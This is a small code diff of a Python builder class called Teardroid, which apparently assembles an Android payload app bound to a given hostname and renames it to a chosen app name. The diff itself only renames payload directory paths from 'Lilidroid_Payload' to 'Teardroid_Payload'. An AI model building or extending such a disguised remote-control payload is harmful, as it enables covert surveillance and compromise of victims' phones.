@@ -5,7 +5,7 @@ from colorama import Fore, Style
 class Teardroid:
     def __init__(self, name) -> None:
         self.name = name
-        self.AppInfo = os.getcwd() + "/Lilidroid_Payload/smali/com/example/teardroidv2/AppInfo.smali"
+        self.AppInfo = os.getcwd() + "/Teardroid_Payload/smali/com/example/teardroidv2/AppInfo.smali"
 
     def build(self, hostname) -> None:
         self.print_result("Building Lilidroid")
@@ -32,7 +32,7 @@ class Teardroid:
 
     def changeAppname(self) -> None:
         self.print_result("Changing app name to " + self.name)
-        file = os.getcwd() + "/Lilidroid_Payload/res/values/strings.xml"
+        file = os.getcwd() + "/Teardroid_Payload/res/values/strings.xml"
         self.modify_file({'data': '    <string name="app_name">{AppName}</string>'.format(
             AppName=self.name), 'line_number': 31, 'file': file})
         self.print_result("Changing app name completed")
